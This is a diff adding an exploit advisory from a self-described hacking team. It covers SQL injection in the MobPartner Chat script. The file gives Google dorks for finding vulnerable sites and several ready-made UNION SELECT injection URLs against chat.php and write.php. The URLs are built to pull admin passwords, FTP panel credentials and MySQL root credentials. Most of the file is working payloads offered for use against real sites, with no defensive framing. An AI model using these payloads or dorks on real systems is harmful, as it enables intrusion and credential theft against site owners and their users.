@@ -1,0 +1,48 @@
+MobPartner Chat  Multiple Sql Injection Vulnerability
+============================================================================
+
+####################################################################
+.:. Author         : AtT4CKxT3rR0r1ST  [F.Hack@w.cn]
+.:. Team           : Sec Attack Team
+.:. Home           : www.sec-attack.com/vb
+.:. Script         : MobPartner
+.:. Download Script: http://www.mobpartner.com/services/chat/?wsid=32174
+.:. Bug Type       : Sql Injection [Mysql]
+.:. Dork           : [1]"Powered by MobPartner" inurl:"chat.php"
+                       [2]"Powered by MobPartner" inurl:"write.php"
+####################################################################
+
+===[ Exploit ]===
+
+www.site.com/chat.php?id=[SQL INJECTION]
+www.site.com/write.php?id=[SQL INJECTION]
+
+********************************************************************
+ T0 Get Username & Password Admin Site
+
+[Sql Injection ; {Username & password Admin}]
+
+www.site.com/chat.php?id=null+and+1=2+union+select+1,concat(id,0x3a,username,0x3a,password),3,4,5,6+from+texad_admin.users--
+www.site.com/write.php?id=null+and+1=2+union+select+1,concat(id,0x3a,username,0x3a,password),3,4,5,6+from+texad_admin.users--
+
+
+********************************************************************
+ T0 Get Username & Password FTP Control Panel
+
+[Sql Injection ; {Username & Password FTP Control Panel}]
+
+www.site.com/chat.php?id=null+and+1=2+union+select+1,concat(user,0x3a,password),3,4,5,6+from+pureftpd.ftpd--
+www.site.com/write.php?id=null+and+1=2+union+select+1,concat(user,0x3a,password),3,4,5,6+from+pureftpd.ftpd--
+
+
+********************************************************************
+ T0 Get Username & Password Root Server
+
+[Sql Injection ; {Username & Password Root Server}]
+
+www.site.com/chat.php?id=null+and+1=2+union+select+1,concat(host,0x3a,user,0x3a,password),3,4,5,6+from+mysql.user--
+www.site.com/write.php?id=null+and+1=2+union+select+1,concat(host,0x3a,user,0x3a,password),3,4,5,6+from+mysql.user--
+
+####################################################################
+
+Greats T0: HackxBack & Zero Cold & All My Friend & All Member Sec Attack
